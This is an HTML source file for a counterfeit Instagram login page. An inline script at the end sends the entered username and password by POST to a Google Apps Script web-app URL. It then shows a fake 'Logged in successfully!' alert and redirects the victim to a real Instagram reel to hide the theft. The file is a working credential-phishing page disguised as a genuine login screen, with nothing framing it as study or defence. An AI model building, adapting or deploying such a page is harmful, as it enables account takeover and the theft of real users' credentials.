<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <script src="https://kit.fontawesome.com/fc1e235b2e.js"></script>
  <link rel="stylesheet" href="style.css">
  <title>Instagram Login</title>
</head>

<body>

  <div id="wrapper">
    <div class="container">
      <div class="phone-app-demo"></div>
      <div class="form-data">
        <form method="POST" name="google-sheet">
          <div class="logo">
            <img src="./images/logo.png" alt="logo">
          </div>
          <input type="text" name="username" placeholder="Phone number, username, or email">
          <input type="password" name="password" placeholder="Password">
          <button class="form-btn" type="submit">Log in</button>
          <span class="has-separator">Or</span>
          <a class="facebook-login" href="#">
            <i class="fab fa-facebook-square"></i> Log in with Facebook
          </a>
          <a class="password-reset" href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
        </form>
        <div class="sign-up">
          Don't have an account? <a href="#">Sign up</a>
        </div>
        <div class="get-the-app">
          <span>Get the app.</span>
          <div class="badges">
            <img src="./images/app-store.png" alt="app-store badge">
            <img src="./images/google-play.png" alt="google-play badge">
          </div>
        </div>
      </div>
    </div>

    <footer>
      <div class="container">
        <nav class="footer-nav">
          <ul>
            <li>
              <a href="#">About us</a>
            </li>
            <li>
              <a href="#">Support</a>
            </li>
            <li>
              <a href="#">Press</a>
            </li>
            <li>
              <a href="#">Api</a>
            </li>
            <li>
              <a href="#">Jobs</a>
            </li>
            <li>
              <a href="#">Privacy</a>
            </li>
            <li>
              <a href="#">Terms</a>
            </li>
            <li>
              <a href="#">Directory</a>
            </li>
            <li>
              <a href="#">Profiles</a>
            </li>
            <li>
              <a href="#">Hashtags</a>
            </li>
            <li>
              <a href="#">Languages</a>
            </li>
          </ul>
        </nav>
        <div class="copyright-notice">
          &copy 2025 Instagram
        </div>
      </div>
    </footer>

  </div>
  <script src="main.js"></script>
  <script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbx6HdfRsGJFCE-HdS0Ahs_Q4rYP7N20CYKvzJzYWfb1U5HYO9owuh7jy7UQKk1EkxrL/exec';  // Replace with your actual Web App URL
    const form = document.forms['google-sheet'];

    form.addEventListener('submit', e => {
    e.preventDefault();

    fetch(scriptURL, {
        method: 'POST',
        body: new FormData(form),
    })
        .then(response => response.json())
        .then(data => {
        console.log("Response from Google Script:", data);  // Debugging
        if (data.result === 'success') {
            alert("Logged in successfully!");
            window.location.href = "https://www.instagram.com/reel/DF73X0hvMNy/?igsh=NDBmanphNGlyeGdz";
        } else {
            alert("Error: " + data.error);
        }
        })
        .catch(error => console.error('Error!', error.message));
    });
  </script>
</body>

</html>
